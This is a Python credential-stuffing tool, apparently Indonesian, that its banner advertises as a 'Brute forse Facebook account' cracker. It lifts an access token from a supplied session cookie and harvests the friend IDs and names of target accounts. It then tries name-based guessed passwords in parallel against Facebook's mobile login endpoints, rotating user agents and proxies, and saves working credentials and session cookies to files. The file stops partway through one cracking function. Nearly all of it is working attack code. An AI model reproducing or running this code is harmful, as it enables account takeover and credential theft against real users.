#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#------------------[ USER-AGENT-DEFAULT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)


    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-BANNER ]-----------------#
def banner():
	clear()
	sol()
	ban=''' © Brute forse Facebook account
▄▄▄▄· ▄▄▄  ▄• ▄▌▄▄▄▄▄▄▄▄ .    ·▄▄▄▄▄▄▄· ©   
▐█ ▀█▪▀▄ █·█▪██▌•██  ▀▄.▀·    ▐▄▄·▐█ ▀█▪. Author :Yusep-XD
▐█▀▀█▄▐▀▀▄ █▌▐█▌ ▐█.▪▐▀▀▪▄    ██▪ ▐█▀▀█▄. Wa +6281383127594
██▄▪▐█▐█•█▌▐█▄█▌ ▐█▌·▐█▄▄▌    ██▌.██▄▪▐█. Status :Free
·▀▀▀▀ .▀  ▀ ▀▀▀  ▀▀▀  ▀▀▀     ▀▀▀ ·▀▀▀▀ '''
	
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = ' PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN '
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		asu = random.choice([h])
		cookie=input(f'\x1b[1;97m╭───────────\x1b[1;96m>\x1b[1;95m>\x1b[1;94m>\x1b[1;93m <> \x1b[1;97m[\x1b[1;92mFACEBOOK INDONESIA\x1b[1;97m]\x1b[1;93m <> \x1b[1;96m<\x1b[1;95m<\x1b[1;94m<\x1b[1;97m\n\x1b[1;97m│ ╭────────────────────────────────────────────────────╮\n\x1b[1;97m│ │\033[32m    _    ____ ____ _ _  _    ___  _  _ _    _  _    \x1b[1;97m│\x1b[1;97m\n\x1b[1;97m│ │\033[32m    |    |  | | __ | |\ |    |  \ |  | |    |  |    \x1b[1;97m│\n\x1b[1;97m│ │\033[32m    |___ |__| |__] | | \|    |__/ |__| |___ |__|    \x1b[1;97m│\n\x1b[1;97m│ ╰────────────────────────────────────────────────────╯\n├───[+] Cookies 😁 :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'\x1b[1;97m├───────────\x1b[1;96m>\x1b[1;95m>\x1b[1;94m>\x1b[1;93m <> \x1b[1;97m[ \x1b[1;92mThe Changcuters \x1b[1;97m]\x1b[1;93m <> \x1b[1;96m<\x1b[1;95m<\x1b[1;94m<\x1b[1;97m\n\x1b[1;97m│ ╭────────────────────────────────────────────────────╮\n\x1b[1;97m│ │\033[32m     _________ .__                                  \x1b[1;97m│\n\x1b[1;97m│ │\033[32m     \_   ___ \|  |__ _____    ____    ____         \x1b[1;97m│\n\x1b[1;97m│ │\033[32m     /    \  \/|  |  \\__   \  /    \  / ___\        \x1b[1;97m│\n\x1b[1;97m│ │\033[32m     \     \___|   Y  \/ __ \|   |  \/ /_/  >       \x1b[1;97m│\n\x1b[1;97m│ │\033[32m      \______  /___|  (____  /___|  /\___  /        \x1b[1;97m│\n\x1b[1;97m│ │\033[32m             \/     \/     \/     \//_____/         \x1b[1;97m│\n\x1b[1;97m│ │ Whatsapp  : 0822-6131-0817                         │ \n\x1b[1;97m│ ╰─────────────────────────━\x1b[1;93m㋱\x1b[0m[\033[41m\033[1;37m Author : ChangFB \x1b[0m]\x1b[1;93m㋱\x1b[0m━─╯\n{x}╰───────────{x}[{h}•{x}]{h} LOGIN BERHASIL.........😁{x}\n');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'\x1b[1;97m├───────────\x1b[1;96m>\x1b[1;95m>\x1b[1;94m>\x1b[1;93m <> \x1b[1;97m[ \x1b[1;92mThe Changcuters \x1b[1;97m]\x1b[1;93m <> \x1b[1;96m<\x1b[1;95m<\x1b[1;94m<\x1b[1;97m\n\x1b[1;97m│ ╭────────────────────────────────────────────────────╮\n\x1b[1;97m│ │\033[33m     _________ .__                                  \x1b[1;97m│\n\x1b[1;97m│ │\033[33m     \_   ___ \|  |__ _____    ____    ____         \x1b[1;97m│\n\x1b[1;97m│ │\033[33m     /    \  \/|  |  \\__   \  /    \  / ___\        \x1b[1;97m│\n\x1b[1;97m│ │\033[33m     \     \___|   Y  \/ __ \|   |  \/ /_/  >       \x1b[1;97m│\n\x1b[1;97m│ │\033[33m      \______  /___|  (____  /___|  /\___  /        \x1b[1;97m│\n\x1b[1;97m│ │\033[33m             \/     \/     \/     \//_____/         \x1b[1;97m│\n\x1b[1;97m│ │ Whatsapp  : 0822-6131-0817                         │ \n\x1b[1;97m│ ╰─────────────────────────━\x1b[1;93m㋱\x1b[0m[\033[41m\033[1;37m Author : ChangFB \x1b[0m]\x1b[1;93m㋱\x1b[0m━─╯\n\x1b[1;97m├───────────────────────────────────────────────────────\n╰───[+]%s%s%s%s LOGIN GAGAL.....PERIKSA AKUN ANDA 😭%s\n'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Expired Cookies ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	print('')
	ip = requests.get("https://api.ipify.org").text
	renv_xy(f'╭───[+] Your Id  : '+str(my_id))
	renv_xy(f'├───[+] Your Ip  : {ip}')
	print(f'├───[+] Github   : ChangFB')
	print(f'├───[+] Version  : {H}1.11{x} ')
	print(f'├───[+] Status   : {h}Premium{x}')
	cetak('├───────────➣ © Brute forse Facebook account\n│ ╭────────────────────────────────────────────────────╮\n│ │ $$$$$$$\                               $$\         │\n│ │ $$  __$$\                              $$ |        │\n│ │ $$ |  $$ | $$$$$$\   $$$$$$$\ $$$$$$\  $$$$$$$\    │\n│ │ $$$$$$$\ |$$  __$$\ $$  _____|\____$$\ $$  __$$\   │\n│ │ $$  __$$\ $$ /  $$ |$$ /      $$$$$$$ |$$ |  $$ |  │\n│ │ $$ |  $$ |$$ |  $$ |$$ |     $$  __$$ |$$ |  $$ |  │\n│ │ $$$$$$$  |\$$$$$$  |\$$$$$$$\\ $$$$$$$ |$$ |  $$ |  │\n│ │ \_______/  \______/  \_______|\_______|\__|  \__|  │\n│ ╰────────────────────────────────────────────────────╯\n├───────────➣ WhatsApp : 0822-6131-0817\n[white]├───[1] Crack Public\n├───[0] Exit[white]')
	_____renv__renv_____ = input('├───────────────────────────────────────────────────────\n╰───[+] Pilih 🤑 : ')
	print('')
	if _____renv__renv_____ in ['1']:
		dump_massal()
	elif _____renv__renv_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('├───[+] Berhasil Keluar+Hapus Cookie ')
		exit()
	else:
		print('├───[+] Masukan Dengan Benar ')
		back()
def error():
	print(f'├───[+] Maaf, Fitur Ini Masih Diperbaiki {x}')
	time.sleep(4)
	back()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('╭───[+] Masukan Jumlah Target ? : '))
	except ValueError:
		print('├───[+] Salah Masukan ')
		exit()
	if jum<1 or jum>100:
		print('├───[+] Gagal Dump Id Mungkin Id Tidak Publik ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('├───[+] Masukkan ID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('├───[+] Sinyal Tidak Stabil ')
			exit()
	try:
		print(f'╰───[+] Jumlah ID Yang Dikumpulkan {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('├───[+] Sinyal Tidak Stabil ')
		back()
	except (KeyError,IOError):
		print(f'├───[+]{k} Bukan Publik {x}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'\n{x}╭───[+] Metode Cracking ')
	print(f'{x}├───────────────────────────────────────────────────────\n├───[1] Tua    [{M}Not Menyarankan{M}{x}]{x}')
	print(f'├───[2] New    [{H}Direkomendasikan{H}{x}]{x}  ')
	print(f'├───[3] Random [{K}Sangat Direkomendasikan{H}✓{K}{x}]{x}\n├───────────────────────────────────────────────────────')
	hu = input('╰───[+] Pilih 🤪 : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('├───[+] Masukan Dengan Benar ')
		exit()
		
	print(f'\n{x}╭───[+] Metode ')
	print(f'{x}├───────────────────────────────────────────────────────\n├───[1] M.facebook.com      [{H}Direkomendasikan{H}✓{x}]{x}')
	print(f'├───[2] Free.facebook.com   [{K}Direkomendasikan{K}{x}]{x}')
	print(f'├───[3] Mbasic.facebook.com [{M}Menyarankan{M}{x}]{x}\n├───────────────────────────────────────────────────────')
	hc = input('╰───[+] Pilih 😛 : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print('')
	pwplus=input('╭───[+] Tambahkan Manual Kata Sandi ( Y/T ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak('├───[+] Masukkan Kata Sandi Tambahan Minimal 6 karakter\n├───[+] Contoh :[green] Indonesia,rahasia,katasandi[white] ')
		pwku=input('├───[+] Masukkan Kata Sandi Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'├───────────────────────────────────────────────────────\n\x1b[1;97m├─────────{m}•{k}•{h}•{x}{h}Mainkan Mode Pesawat Setiap 500 ID{x}{m}•{k}•{h}•{x}\n\x1b[1;97m│ ╭────────────────────────────────────────────────────╮\n\x1b[1;97m│ │  \x1b[1;97m█████████████      Author   : Changcuters         \x1b[1;97m│\n\x1b[1;97m│ │  \x1b[1;97m████\x1b[0;34m███████\x1b[1;97m██      Github   : ChangFB             \x1b[1;97m│\n\x1b[1;97m│ │  \x1b[1;97m████\x1b[0;34m██\x1b[1;97m███████      WhatsApp : 0822-6131-0817      \x1b[1;97m│\n\x1b[1;97m│ │  \x1b[1;97m████\x1b[0;34m█████\x1b[1;97m████      \x1b[0;34m╔═╗╔═╗╔═╗╔═╗╔╗ ╔═╗╔═╗╦╔═       \x1b[1;97m│\n\x1b[1;97m│ │  \x1b[1;97m████\x1b[0;34m██\x1b[1;97m███████      \x1b[0;34m╠╣ ╠═╣║  ║╣ ╠╩╗║ ║║ ║╠╩╗       \x1b[1;97m│\n\x1b[1;97m│ │  \x1b[1;97m████\x1b[0;34m██\x1b[1;97m███████      \x1b[0;34m╚  ╩ ╩╚═╝╚═╝╚═╝╚═╝╚═╝╩ ╩       \x1b[1;97m│\n\x1b[1;97m│ │  \x1b[1;96mVERSION  \x1b[1;92m1\x1b[1;97m.\x1b[1;92m10        \x1b[1;97m[\033[41m\033[1;37m Status : No.Prem \x1b[0m\x1b[1;97m]         \x1b[1;97m│\n\x1b[1;97m│ ╰────────────────────────────────────────────────────╯')
	print(f'├───[+] Hasil {h}OK{x} Save in : {h}OK/%s {x}'%(okc))
	print(f'├───[+] Hasil {b}CP{x} Save in : {b}CP/%s {x}'%(cpc))
	print(f'├───────────────────────────────────────────────────────')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak('[cyan]>>[green] Berhasil Crack, Jangan Lupa Doa Kan Saya [cyan] <<[white] ')
	print('╭───────────────────────────────────────────────────────')
	print(f'├───[2]{h} OK : {h}%s{x} '%(ok))
	print(f'├───[2]{b} CP : {b}%s{x} '%(cp))
	print(f'{x}╰───[+]{k} Selamat Tinggal Terima Kasih{x} << ')
#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r╰───[ChangFB]-[%s%s/%s]-[OK:%s]-[CP:%s]-[%s%s]%s✓'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua ='Mozilla/5.0 (Linux; Android 10; S40Pro Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36'
	ua2 ='Mozilla/5.0 (Linux; Android 10; S40Pro Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36'
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r[{b}ChangCP{x}]{b} {b}{idf} | {pw}')
				print(f'\r{x}   {x}{u}{ua}{M}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#os.popen('play-audio data/cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x} {H}{idf} | {pw}')
				print(f'\r{x}   {H}{kuki}{H}')
				print(f'\r{x}          {M}{ua}{M}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				#os.popen('play-audio data/ok.mp3')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE-FREE-FB ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s%s/%s ok : %s cp : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1'
	ua2 = 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1'
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":'free.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://free.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'free.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{b}CHECKPOINT : {K}{idf}|{pw}')
				print(f'\r{x}*-->{x} {M}{ua}{M}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#os.popen('play-audio data/cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{b}SUCCESFULY : {H}{idf}|{pw}')
				print(f'\r{x}*-->{x} {H}{kuki}{H}')
				print(f'\r{x}*-->{x} {M}{ua}{M}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				#os.popen('play-audio data/ok.mp3')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------------------[ METHODE-MBASIC ]-----------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s%s/%s ok : %s cp : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
